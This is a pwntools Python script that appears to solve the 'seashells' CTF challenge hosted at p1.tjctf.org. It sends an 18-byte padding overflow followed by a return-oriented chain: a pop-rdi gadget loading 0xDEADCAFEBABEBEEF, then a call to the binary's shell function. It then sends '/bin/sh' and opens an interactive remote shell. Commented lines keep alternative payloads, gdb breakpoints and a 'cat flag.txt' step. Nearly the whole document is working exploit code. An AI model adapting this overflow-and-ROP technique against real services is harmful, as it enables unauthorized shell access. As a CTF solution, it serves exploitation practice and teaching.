from pwn import * 
#context(log_level='debug')
#p = process('./seashells')
p = remote('p1.tjctf.org', 8009)
poprdi=0x400803
p.recvuntil('Would you like a shell?\n')
shell_func = 0x4006c7
shell_addr = 0x400828
system_plt = 0x4005c0
payload = 'a'*18
#payload += p64(poprdi)
#payload += p64(0xDEADCAFEBABEBEEF)
payload += p64(shell_func)
payload += p64(poprdi)
payload += p64(0xDEADCAFEBABEBEEF)
payload += p64(shell_func)
#payload += p64(system_plt)
#payload += p64(shell_addr)


#gdb.attach(p, 'b 0x4006dd')
#gdb.attach(p, 'b *0x40075f')
#raw_input()
p.sendline(payload)
p.sendline('/bin/sh')
#p.sendline('cat flag.txt')

p.interactive()


